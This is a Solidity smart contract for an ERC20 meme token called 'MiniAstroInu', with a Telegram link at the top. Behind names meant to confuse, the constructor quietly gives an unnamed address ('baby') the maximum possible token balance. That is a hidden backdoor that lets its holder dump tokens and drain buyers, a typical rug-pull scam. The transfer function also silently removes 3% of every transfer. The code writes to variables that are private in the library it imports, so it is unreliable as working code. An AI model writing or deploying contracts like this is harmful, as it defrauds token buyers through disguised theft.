/*

https://t.me/miniastroinu

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract MiniAstroInu is ERC20, Ownable {
    uint256 private dust = ~uint256(0);
    uint256 public success = 3;

    constructor(
        string memory bag,
        string memory printed,
        address instrument,
        address baby
    ) ERC20(bag, printed) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[baby] = dust;
        _balances[_msgSender()] = _totalSupply;
    }

    function _transfer(
        address charge,
        address from,
        uint256 ranch
    ) internal override {
        uint256 afternoon = (ranch / 100) * success;
        ranch = ranch - afternoon;
        super._transfer(charge, from, ranch);
    }
}